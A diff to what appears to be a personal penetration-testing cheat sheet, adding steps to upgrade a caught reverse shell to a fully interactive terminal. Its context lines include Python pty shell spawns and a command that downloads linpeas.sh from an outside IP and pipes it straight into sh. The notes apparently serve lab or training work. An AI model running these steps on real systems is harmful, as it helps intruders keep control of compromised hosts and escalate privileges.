@@ -5,6 +5,23 @@
 python -c "import pty;pty.spawn('/bin/bash')"
 python3 -c "import pty;pty.spawn('/bin/bash')"
 ```
+##### FULL INTERACTIVE SHELL...YEEEEAHHHUUHHH...
+```bash
+https://null-byte.wonderhowto.com/how-to/upgrade-dumb-shell-fully-interactive-shell-for-more-flexibility-0197224/
+
+You need to be in a /bin/bash not kali's zshell. So catch the reverse shell first with:
+/bin/bash
+*catch the reverse shell*
+python -c "import pty;pty.spawn('/bin/bash')"
+^Z
+echo $TERM
+stty -a
+stty raw -echo
+fg
+reset
+xterm-256color
+xterm
+```
 ##### wget in ram
 ```bash
 Wget -O - http://192.168.49.66/linpeas.sh | sh
